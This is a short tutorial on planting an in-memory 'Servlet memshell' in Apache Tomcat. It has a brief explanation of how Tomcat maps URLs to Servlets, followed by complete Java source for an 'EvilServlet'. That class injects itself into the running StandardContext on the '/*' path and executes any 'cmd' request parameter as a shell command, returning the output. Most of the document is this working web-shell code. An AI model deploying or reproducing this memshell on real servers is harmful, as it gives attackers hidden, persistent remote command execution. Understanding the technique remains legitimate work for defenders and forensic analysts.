# Servlet memshell

## Analysis

The process of the `Tomcat` matching a specific `Servlet` according to the request URL:

* Traverse a `children` and get the corresponding `child` according to the `ServletMapping` object, an URL mapping.

* The `child` is actually a `Wrapper` class, and the `Wrapper` object encapsulates the `Servlet`.

To add a `Servlet` dynamically, we should:

* Create a `Wrapper` object to encapsulate the `Servlet`.

* Call the `addchild()` method of the `StandardContext` class to add the `Wrapper` object to the `children`.

* Call the `addServletMappingDecoded()` method of the `StandardContext` class to establish the URL mapping.

In addition, we must achieve the `service()` method and write malicious code in this method.

## Code

    public class EvilServlet extends AbstractTranslet implements Servlet {
        static {
            final String name = "Ya0h4cker";
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            try {
                Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
                field.setAccessible(true);
                WebResourceRoot resources = (WebResourceRoot) field.get(webappClassLoaderBase);
                StandardContext standardContext = (StandardContext) resources.getContext();

                if (standardContext.findChild(name) == null) {
                    Servlet servlet = new EvilServlet();

                    Wrapper wrapper = standardContext.createWrapper();
                    wrapper.setName(name);
                    wrapper.setServlet(servlet);
                    wrapper.setServletClass(servlet.getClass().getName());

                    standardContext.addChild(wrapper);
                    standardContext.addServletMappingDecoded("/*", name);
                    System.out.println("Inject success");
                }
            } catch (NoSuchFieldException | IllegalAccessException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }

        @Override
        public void init(ServletConfig servletConfig) throws ServletException {
        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            System.out.println("Evil service");
            if (servletRequest.getParameter("cmd") != null) {
                String cmd = servletRequest.getParameter("cmd");
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                PrintWriter out = servletResponse.getWriter();
                out.println(output);
                out.flush();
                out.close();
            }
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {
        }
    }
